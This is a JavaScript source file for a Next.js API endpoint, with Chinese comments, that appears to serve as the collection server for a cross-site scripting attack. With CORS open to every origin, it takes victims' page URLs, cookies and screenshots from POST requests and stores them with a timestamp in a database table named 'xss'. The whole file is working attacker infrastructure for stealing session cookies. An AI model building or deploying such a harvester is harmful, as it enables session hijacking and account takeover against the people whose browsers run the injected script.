// pages/api/get.js
import { supabase } from '../../utils/supabaseClient';
import moment from 'moment-timezone';

export default async function handler(req, res) {
  // 设置 CORS 头部
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // 处理预检请求（OPTIONS）
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method === 'POST') {
    try {
      // 获取请求体中的数据
      const { url = 'null', cookie = 'null', screenshot } = req.body;

      // 获取当前的中国时间
      const chinaTime = moment().tz('Asia/Shanghai').format('YYYY-MM-DD HH:mm:ss');

      // 验证请求体是否包含必要字段

      // 插入数据到 Supabase 的 xss 表
      const { data, error } = await supabase
        .from('xss')
        .insert([{ url, cookie, screenshot, trigger_time: chinaTime }])
        .single();

      if (error) {
        console.error('插入数据时出错:', error);
        return res.status(500).json({ error: '插入数据失败', details: error.message });
      }

      // 返回成功响应
      res.status(200).json({
        message: '数据插入成功',
        insertedData: data,
      });
    } catch (error) {
      console.error('处理 POST 请求时出错:', error);
      res.status(500).json({ error: '服务器内部错误' });
    }
  } else {
    // 如果不是 POST 请求，返回 405 Method Not Allowed
    res.setHeader('Allow', ['POST']);
    res.status(405).end(`Method ${req.method} Not Allowed`);
  }
}